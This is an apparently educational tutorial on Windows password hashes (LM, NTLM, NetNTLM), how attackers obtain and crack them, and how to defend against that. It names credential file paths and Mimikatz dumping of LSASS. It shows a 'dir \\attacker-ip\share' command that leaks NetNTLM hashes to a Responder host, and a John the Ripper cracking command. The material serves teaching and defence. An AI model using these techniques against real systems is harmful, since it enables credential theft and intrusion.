# Windows Password Hashing and Authentication 

## Overview

Windows uses **hashing** to protect user passwords.

Instead of storing passwords directly, Windows stores a mathematical representation of the password called a **hash**.

Example:

```
Original Password:

Password123

        ↓ Hash Function

Stored Hash:

A3F2C8D91E...
```

If an attacker obtains the hash, they cannot directly convert it back into the original password. However, weak passwords can still be recovered using cracking techniques.

---

# 1. Understanding Hashes

## What is a Hash Function?

A **hash function** is a mathematical algorithm that converts any input into a fixed-length output.

Example:

```
Input:

hello

       ↓ Hash Function

Output:

5d41402abc4b2a76b9719d911017c592
```

The output is called a **hash value**.

---

## One-Way Function

A cryptographic hash is designed to be a **one-way function**.

This means:

### Easy:

```
Password → Hash
```

A computer can quickly calculate the hash.

### Difficult:

```
Hash → Password
```

Finding the original password from a hash is extremely difficult.

---

## Avalanche Effect

A good hash function has the **avalanche effect**.

This means a small input change creates a completely different hash.

Example:

```
Password123

Hash:
A1B2C3...
```

Changing one character:

```
Password124

Hash:
F9D8E7...
```

Even a tiny modification creates a completely different result.

---

# 2. How Windows Authentication Uses Hashes

Windows does not store your actual password.

During login:

1. User enters a password.
2. Windows converts the password into a hash.
3. Windows compares it with the stored hash.
4. If both hashes match, authentication succeeds.

Example:

```
User enters:

MyPassword123

        ↓

Windows creates hash

        ↓

Compare with stored hash

        ↓

Match = Login successful
```

---

# 3. Weak Hash Algorithms

Older hashing algorithms are no longer considered secure.

Example:

## MD5

MD5 was widely used in the past but is now considered insecure because:

* It is fast to calculate.
* Hash collisions can occur.
* Modern hardware can crack it quickly.

Modern systems should use stronger algorithms.

---

# 4. Windows Hash Types

Windows mainly uses several types of password-related hashes.

---

# 4.1 LM Hash (LAN Manager Hash)

## What is LM Hash?

LM Hash is an old Microsoft password hashing method.

It was designed for older Windows systems but is now considered insecure.

---

## Why is LM Hash Weak?

Problems:

* Passwords are converted to uppercase.
* Passwords are limited to 14 characters.
* The password is split into smaller parts.
* It is easy to crack.

Modern Windows systems disable LM Hash storage by default.

---

## Checking LM Hash Status

The registry location is:

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

Look for:

```
NoLMHash
```

Values:

| Value | Meaning                   |
| ----- | ------------------------- |
| 1     | LM Hash disabled (secure) |
| 0     | LM Hash enabled (unsafe)  |

---

# 4.2 NTLM Hash

## What is NTLM Hash?

NTLM is the modern Windows password hash format used for local accounts.

It replaced LM Hash.

---

## How NTLM Hash is Created

The process:

1. Password is converted into UTF-16LE format.
2. The data is hashed using MD4.
3. The result becomes the NTLM hash.

Example:

```
Password

   ↓ UTF-16LE

Encoded Password

   ↓ MD4

NTLM Hash
```

---

## Example

A Windows local account stores:

```
Username:
john

Password:
Password123

Stored:

NTLM Hash
```

The actual password is never stored.

---

# 4.3 NetNTLM Hash

## What is NetNTLM?

NetNTLM is used for **network authentication**.

Unlike NTLM hashes, NetNTLM hashes are not stored password hashes.

They are created during a challenge-response authentication process.

---

# How NetNTLM Authentication Works

Example:

A Windows client wants to access a network server.

### Step 1

Server sends a random challenge:

```
Challenge:
839201AB
```

---

### Step 2

Client uses:

* User password hash
* Server challenge

to create a response.

```
NTLM Hash
+
Challenge

↓

Response
```

---

### Step 3

The server verifies the response.

The password itself is never sent across the network.

---

# 5. Obtaining Windows Hashes

Attackers and security professionals obtain hashes using different methods depending on their privileges.

---

# Method 1: Dumping Local Hashes

## SAM Database

Local Windows password hashes are stored in:

```
C:\Windows\System32\config\SAM
```

The SAM database contains:

* User accounts
* Password hashes
* Security identifiers (SIDs)

Normally, the file is protected by Windows.

---

## Using Backup Privileges

Users with:

```
SeBackupPrivilege
```

can bypass normal file restrictions and create copies of registry hives.

Example:

```
SAM hive
SYSTEM hive
```

These files can later be analyzed offline to extract password hashes.

---

# Extracting Hashes from Memory

Administrators can access the memory of:

```
lsass.exe
```

LSASS manages Windows authentication.

Tools like **Mimikatz** can extract:

* NTLM hashes
* Authentication tokens
* Cached credentials

---

# Active Directory Lateral Movement

In an enterprise environment:

1. An attacker compromises one machine.
2. Extracts local administrator hashes.
3. Uses those hashes on another machine.

This allows movement across the network.

This is called:

**Lateral Movement**

---

# Method 2: Capturing NetNTLM Hashes

## Using Responder

Responder is a network poisoning tool used to capture NetNTLM authentication attempts.

---

## Attack Scenario

An attacker controls a Linux machine.

The victim Windows machine is tricked into connecting to it.

Example:

```cmd
dir \\attacker-ip\share
```

Windows automatically tries to authenticate.

The authentication exchange is captured by Responder.

---

## Captured Data

The attacker receives:

```
NetNTLMv1 Hash

or

NetNTLMv2 Hash
```

These hashes can later be cracked offline.

---

# 6. Cracking Windows Hashes

A hash cannot simply be reversed.

Instead, attackers use a process called:

**Password Cracking**

---

# How Cracking Works

The attacker:

1. Takes a possible password.
2. Calculates its hash.
3. Compares it with the stolen hash.
4. If they match, the password is found.

Example:

```
Wordlist Password

Password123

        ↓

Hash Function

        ↓

Compare

        ↓

Match Found!
```

---

# Wordlists

A wordlist is a collection of possible passwords.

Popular example:

```
rockyou.txt
```

It contains millions of commonly used passwords.

Attackers use wordlists because many users choose weak passwords.

---

# Brute Force Attacks

A brute force attack tries every possible combination.

Example:

```
a
b
c
...
aa
ab
ac
...
```

However, long and complex passwords make brute force extremely slow.

Example:

A 16-character random password may take an unrealistic amount of time to crack.

---

# Password Cracking Tools

Common tools:

## John the Ripper

Used for:

* NTLM cracking
* Hash analysis
* Wordlist attacks

Example:

```bash
john hash.txt --wordlist=rockyou.txt
```

---

## Hashcat

A high-performance password cracking tool.

It uses:

* CPU
* GPU acceleration

to test millions of password guesses quickly.

---

# NTLM vs NetNTLM Cracking

| Hash Type    | Difficulty                 |
| ------------ | -------------------------- |
| NTLM Hash    | Easier to crack            |
| NetNTLM Hash | Slightly slower and harder |

Why?

NTLM hashes are direct password hashes.

NetNTLM includes a challenge-response calculation, which requires more processing.

---

# Example Password Recovery

A captured hash may be cracked using a wordlist:

```
Captured Hash:

NTLM Hash

        ↓

Hashcat / John

        ↓

Recovered Password:

Password23!
```

Weak passwords can be recovered quickly.

---

# Protecting Windows Password Hashes

## Use Strong Passwords

Avoid:

* Common words
* Short passwords
* Reused passwords

Use:

* Long passwords
* Passphrases
* Password managers

---

## Disable Weak Hash Storage

Ensure:

```
NoLMHash = 1
```

to prevent LM hash storage.

---

## Limit Administrative Access

Avoid giving unnecessary users:

* Administrator privileges
* Backup privileges

---

## Enable Security Monitoring

Monitor:

* LSASS access
* Credential dumping attempts
* Suspicious authentication activity

---

